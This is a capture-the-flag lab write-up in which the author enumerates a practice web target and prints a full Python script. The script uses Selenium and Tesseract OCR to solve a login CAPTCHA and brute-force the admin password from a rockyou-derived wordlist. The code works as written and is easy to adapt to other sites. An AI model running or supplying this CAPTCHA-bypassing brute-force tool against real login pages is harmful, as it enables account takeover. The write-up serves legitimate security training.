Description
The web application has a login form with three fields: username, password, and CAPTCHA. To prevent automated brute-forcing, a CAPTCHA changes every time the page is loaded.
This project solves the CAPTCHA bypass by automating Firefox browser via Selenium and using OCR (Tesseract library) to recognize the CAPTCHA text. The script loads the page, extracts the CAPTCHA image, processes it to improve OCR accuracy, inputs the credentials, and attempts to login automatically.

My IP Addresses
Attacker machine IP (my IP): 10.10.82.126

Target machine IP: 10.10.104.119

What I Did
Analyzed the web application, found a login form with CAPTCHA on port 80 of the target machine.

Enumerated the web directories using gobuster, confirmed PHP backend.

Prepared a wordlist with the first 100 passwords from rockyou.txt.

Developed a Python script using Selenium and Firefox to automate login and bypass CAPTCHA.

Used Tesseract OCR for CAPTCHA text recognition.

Applied image processing to the CAPTCHA to enhance recognition accuracy.

Ran the script — successfully brute-forced the password and retrieved the flag.

Code Snippet (Key Parts)

from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
import time
from PIL import Image, ImageEnhance, ImageFilter
import io
import pytesseract

options = Options()
options.add_argument('--headless')  # Run in headless mode
options.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0")

service = Service(executable_path='/usr/bin/geckodriver')
browser = webdriver.Firefox(service=service, options=options)

ip = 'http://10.10.104.119/'
login_url = f'{ip}index.php'
dashboard_url = 'dashboard.php'
username = "admin"

with open("wordlist.txt", 'r', encoding='utf-8') as file:
    passwords = [line.strip() for line in file]

for password in passwords:
    print(f"[*] Trying password: {password}")
    while True:
        browser.get(login_url)
        time.sleep(1)

        captcha_img = browser.find_element(By.TAG_NAME, "img")
        captcha_png = captcha_img.screenshot_as_png

        image = Image.open(io.BytesIO(captcha_png)).convert("L")
        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)
        image = image.filter(ImageFilter.SHARPEN)
        image = ImageEnhance.Contrast(image).enhance(2.0)
        image = image.point(lambda x: 0 if x < 140 else 255, '1')

        captcha_text = pytesseract.image_to_string(
            image,
            config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
        ).strip().replace(" ", "").replace("\n", "").upper()

        if not captcha_text.isalnum() or len(captcha_text) != 5:
            print(f"[!] OCR failed: '{captcha_text}', retrying...")
            continue

        browser.find_element(By.ID, "username").send_keys(username)
        browser.find_element(By.ID, "password").send_keys(password)
        browser.find_element(By.ID, "captcha_input").send_keys(captcha_text)
        browser.find_element(By.ID, "login-btn").click()

        time.sleep(1)

        if dashboard_url in browser.current_url:
            print(f"[+] Login successful with password: {password}")
            try:
                flag = browser.find_element(By.TAG_NAME, "p").text
                print(f"[+] Flag: {flag}")
            except:
                print("[!] Flag not found.")
            browser.quit()
            exit()
        else:
            if "error" in browser.current_url:
                print(f"[-] Incorrect password: {password}")
                break
            else:
                print("[-] CAPTCHA failed, retrying...")
                continue

browser.quit()
Summary
Automated successful password brute-force with CAPTCHA bypass.

Retrieved the flag from the target machine.

Used Firefox and Selenium to control the browser and bypass protection.

Used Tesseract OCR with image preprocessing for CAPTCHA recognition.
